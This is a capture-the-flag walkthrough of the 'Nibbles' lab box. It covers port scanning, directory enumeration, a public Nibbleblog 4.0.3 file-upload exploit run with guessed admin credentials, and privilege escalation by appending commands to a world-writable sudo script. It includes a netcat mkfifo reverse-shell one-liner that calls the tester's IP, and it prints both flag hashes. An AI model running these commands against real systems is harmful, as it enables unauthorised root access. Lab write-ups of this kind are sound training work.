
## Intro


Tags: #linux #WebApp #OSCPpath #unknown-binary #easy

------------
# Reconnaissance

#### Add machine to `/etc/hosts`
```shell
echo '10.129.96.84 nibbles.htb' | sudo tee -a /etc/hosts
```
## Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  nibbles.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 13:59 -0400
Nmap scan report for nibbles.htb (10.129.96.84)
Host is up (0.11s latency).
Not shown: 64598 closed tcp ports (reset), 935 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A nibbles.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-13 14:02 -0400
Nmap scan report for nibbles.htb (10.129.96.84)
Host is up (0.048s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4, Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   48.88 ms 10.10.14.1
2   49.34 ms nibbles.htb (10.129.96.84)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
```

## WebApp

![](MediaFiles/Pasted%20image%2020260613205936.png)

### page source

![](MediaFiles/Pasted%20image%2020260613205951.png)
lets navigate to `/nibbleblog`
![](MediaFiles/Pasted%20image%2020260613210017.png)

### Directory enum

```shell
dirsearch -u http://nibbles.htb/nibbleblog/ -x 403,404
```

```shell
  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                 
 (_||| _) (/_(_|| (_| )                                                                                                                          
                                                                                                                                                 
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ch3ckm8/Downloads/reports/http_nibbles.htb/_nibbleblog_26-06-13_14-05-35.txt

Target: http://nibbles.htb/

[14:05:35] Starting: nibbleblog/                                                                                                                 
[14:05:45] 301 -  321B  - /nibbleblog/admin  ->  http://nibbles.htb/nibbleblog/admin/
[14:05:45] 200 -  606B  - /nibbleblog/admin.php                             
[14:05:45] 200 -  516B  - /nibbleblog/admin/                                
[14:05:46] 200 -  563B  - /nibbleblog/admin/js/tinymce/                     
[14:05:46] 301 -  332B  - /nibbleblog/admin/js/tinymce  ->  http://nibbles.htb/nibbleblog/admin/js/tinymce/
[14:05:57] 301 -  323B  - /nibbleblog/content  ->  http://nibbles.htb/nibbleblog/content/
[14:05:57] 200 -  485B  - /nibbleblog/content/                              
[14:05:57] 200 -  724B  - /nibbleblog/COPYRIGHT.txt                         
[14:06:05] 200 -   92B  - /nibbleblog/install.php                           
[14:06:05] 200 -   92B  - /nibbleblog/install.php?profile=default           
[14:06:06] 301 -  325B  - /nibbleblog/languages  ->  http://nibbles.htb/nibbleblog/languages/
[14:06:07] 200 -   12KB - /nibbleblog/LICENSE.txt                           
[14:06:15] 200 -  694B  - /nibbleblog/plugins/                              
[14:06:15] 301 -  323B  - /nibbleblog/plugins  ->  http://nibbles.htb/nibbleblog/plugins/
[14:06:17] 200 -    5KB - /nibbleblog/README                                
[14:06:24] 301 -  322B  - /nibbleblog/themes  ->  http://nibbles.htb/nibbleblog/themes/
[14:06:24] 200 -  498B  - /nibbleblog/themes/                               
[14:06:25] 200 -  815B  - /nibbleblog/update.php                            
                                                                             
Task Completed    
```
#### Version discovered

![](MediaFiles/Pasted%20image%2020260613210744.png)
found version Nibbleblog 4.0.3

------------
# Foothold

## Vulnerable webapp version

lets see if we can find any exploits for it
https://github.com/dix0nym/CVE-2015-6967/blob/main/exploit.py
```shell
└─$ python3 nibbles.py --url http://nibbles.htb/nibbleblog/ --username admin --password nibbles --payload php-reverse-shell.php               
[+] Login Successful.
[+] Upload likely successfull.
```
got shell back, grabbed user flag

## Shell as nibbler
```shell
└─$ nc -lvnp 4444                                                                                                                                
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.96.84] 33960
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 14:14:17 up 18 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/$ ls
ls
bin   home            lib64       opt   sbin  tmp      vmlinuz.old
boot  initrd.img      lost+found  proc  snap  usr
dev   initrd.img.old  media       root  srv   var
etc   lib             mnt         run   sys   vmlinuz
nibbler@Nibbles:/$ cd
cd
bash: cd: HOME not set
nibbler@Nibbles:/$ cd home
cd home
nibbler@Nibbles:/home$ ls
ls
nibbler
nibbler@Nibbles:/home$ cd nibbler
cd nibbler
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
dcb8e65288a26d612cc4f1cca869fd95
nibbler@Nibbles:/home/nibbler$ 
```

----------
# Privesc

## sudo -l

```shell
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
### Custom script exploitation

lets view monitor.sh
```bash
cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```

ok lets run it `./monitor.sh` it displays info about the system

now lets see if we can edit it
```shell
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la                                                                                             
ls -la 
                                            
total 12                                                         
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .                
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..        
-rwxrwxrwx 1 nibbler nibbler 4022 Jun 13 14:26 monitor.sh 
```
perfect! now lets do a test, lets append the command whoami at the end of `monitor.sh`
```shell
echo "whoami" >> monitor.sh
```
now run script with sudo
```shell
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh                                                                                  
sudo ./monitor.sh                                                                                                                                
'unknown': I need something more specific.                                                                                                       
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found                                              
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found                                              
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found                                              
root  
```
great! executes command as root! now for example we can cat the root flag by appending this similarly:
```shell
echo "cat /root/root.txt" >> monitor.sh
```

```shell
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh                                                                                  
sudo ./monitor.sh                                                                                                                                
'unknown': I need something more specific.                                                                                                       
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found                                              
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found                                              
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found                                              
root                                                                                                                                                                                                                                           
82e8f64a85112eae5f002cb89aa03e88  
```
lets be typically correct and open a shell as root via rev shell, append this:
```shell
rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc 10.10.14.148 4444 1>/tmp/b
```
like that:
```shell
echo "rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc 10.10.14.148 4444 1>/tmp/b" >> monitor.sh
```
got shell back

## Shell as root
```shell
└─$ nc -lvnp 4444                                                                                                                               
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.96.84] 33966
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
cat /root/root.txt
82e8f64a85112eae5f002cb89aa03e88
root@Nibbles:/home/nibbler/personal/stuff# 
```

---
# Summary


Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

todo -> wyrmgaze

---
# Sidenotes